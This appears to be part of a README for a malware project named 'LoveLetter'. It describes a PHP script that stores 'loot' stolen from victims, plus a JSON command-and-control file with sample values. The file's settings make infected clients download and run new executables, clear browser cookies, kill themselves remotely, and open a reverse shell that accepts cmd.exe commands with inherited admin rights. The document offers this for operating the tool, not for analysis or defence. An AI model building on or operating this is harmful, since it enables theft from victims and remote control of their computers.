## [TellMe.php](TellMe.php)
The PHP file that handles and stores loot from the letter and stores them nicely structured on the server.

<br/>
<div>
  <img width="100" align="right" src="https://i.ibb.co/FxZQgkC/2.gif" alt="LoveLetter"/>
  <br>
  <h1>⚙️ Configuration</h1>
  <p>Update.json is being fetched by the client to check for any server commands. You can update it to your liking.</p>
</div>

## Sample 
```json
{
  "updateVersion": 0,
  "letterVersion": 0.1,
  "downloadLink": "http://0.0.0.0/new_tll_update.exe",
  "killSelf": false,
  "clearCookies": false,
}
```

## To be written...
> - Update Version ```updateVersion```

The version of the Update.json, always increment this whenever you updated the file, else the letter wont bother to load the json if the value is the same as the last.

> - Letter Version ```letterVersion```

The current latest version of the letter, increment this if you want the letter to download and execute ```downloadLink```.

> - Download Link ```downloadLink```

Direct download link to the newest executable.

> - Kill Self ```killSelf```

Put this to true whenever you want to remotely switch of all letters.

> - Clear Cookies ```clearCookies```

If true, it will clear all cookies and cache of ~~supported~~ popular browsers.

> - Open Shell? ```OpenShell```

If true, compiles a reverse shell and runs it.

> - Shell Bind Interface ```ShellBind```

The ip and port to bind the reverse shell with, it will listen on this interface for any incoming cmd.exe commands. If the letter runs with admin rights, the shell instance will have the same level of permissions as well.
<br/>
<br/>
### For real-time commands you may use the [**Reverse Shell**](../Controller).